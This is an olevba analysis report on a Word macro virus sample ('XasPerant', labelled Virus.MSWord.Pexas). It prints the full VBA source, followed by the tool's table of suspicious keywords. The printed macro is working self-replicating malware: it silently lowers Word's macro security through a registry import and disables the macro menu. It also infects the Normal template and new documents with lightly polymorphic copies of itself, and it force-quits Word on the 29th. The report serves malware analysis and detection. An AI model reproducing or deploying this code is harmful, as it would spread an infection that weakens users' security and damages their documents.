olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas-86a933671d981bc4dbf4b9be9959bf992b62eec6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas-86a933671d981bc4dbf4b9be9959bf992b62eec6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
Sub Document_Open() 'a54Ћ
'<XasPerant> Virus by MI_pirat '6|(\
'XP-only virus (10q Bill 4 a great Office...NOT) '†yX`
On Error Resume Next 'A6:H
StatusBar = Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) '"{L\
zi = Day(Date) 'ЉIIk
If zi = 29 Then 'l’7H
MsgBox Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) + Chr(32) + Chr(82) + Chr(79) + Chr(99) + Chr(107) + Chr(122), vbInformation, Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) '”ѓ:b
Application.Quit (False) 'q€~
End If '1@O–
'DRINK (TM)... Motto: "DRINKDRINKDRINK" !!! '#O!P
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then '6Ћp
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP" 'ђ<>Ћ
Options.SaveNormalPrompt = 5 Xor 5 'Y)jO
Open "C:\a.reg" For Output As #1 'dS‹‡
Print #1, "REGEDIT4" 'bl)0
Print #1, "" 'Yѓ…
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" 'hbnЋ
Print #1, """Level"" = dword:00000001" '*l$)
Close #1 'ђM:l
Shell "C:\Windows\regedit /s C:\a.reg" ':€Њ?
Kill "C:\a.reg" ']wP‰
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1) 'h‰Њs
Randomize 'TЂ,U
nr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines 'I„ ’
Set myTemplate = Templates(1) 'VЉ …
myTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, myTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines 'T>8f
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close" 'Sѓ"{
For i = 2 To nr '@V–e
xxx = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1) 'Њc†j
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) '/+Љ‰
strn = xxx + " '" + poly '_iX"
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, strn 'qqЋЉ
Next i 'hbgA
Documents.Open FileName:=myTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto 'Z"3’
ActiveDocument.Save 'fc;Ќ
ActiveDocument.Close '[z2Љ
End If 'b‰.0
For Each aVar In ActiveDocument.Variables 'b†ZU
    If aVar.Name = "xp" Then num = aVar.Index 'wHEM
Next aVar '‹0>„
If (num = 0) And (NormalTemplate.FullName <> ActiveDocument.FullName) Then '”„f{
ActiveDocument.Variables.Add Name:="xp" 'lud:
ActiveDocument.Variables("xp").Value = 1 'D†—j
Set myTemplate = Templates(1) 'Db&;
nr = myTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines 'K’M”
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines 'CђKR
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Open" 'ђ@Ђ'
For i = 2 To nr 'O•m‚
s = myTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1) 'W"0ѓ
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, s 'E/*R
Next i 'Z—[Q
ActiveDocument.Save ',mKk
End If '='{n
End Sub 'y/5„
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

